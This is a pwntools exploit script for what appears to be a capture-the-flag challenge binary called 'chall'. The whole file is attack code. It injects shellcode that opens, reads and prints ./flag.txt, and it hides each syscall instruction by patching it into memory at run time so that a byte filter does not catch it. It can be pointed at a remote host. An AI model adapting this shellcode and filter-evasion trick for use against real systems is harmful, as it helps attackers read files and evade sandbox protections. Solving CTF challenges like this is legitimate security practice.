from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb
import sys

BINARY = "chall"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
# context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script):
        if not args.RMT:
            attach(self.p, script)

    def send(self, content):
        p = self.p
        p.send(content)

x, p = init()

syscall = u32(asm("syscall;nop;nop;"))
syscall_safe = "mov dword ptr [rip], r12d; nop;nop;nop;nop;"
sc = f"mov r12d, {~syscall}; xor r12d, 0xFFFFFFFF;"
sc += shellcraft.openat(-100, "./flag.txt", constants.O_RDONLY)
sc += shellcraft.read(3, 'rbx', 0x100)
sc += shellcraft.write(1, 'rbx', 0x100)
sc = sc.replace("syscall", syscall_safe)

payload = asm("mov rbx, rdx")
payload += asm(sc)

# x.debug("break *main+319\nc")
x.send(payload)

p.interactive()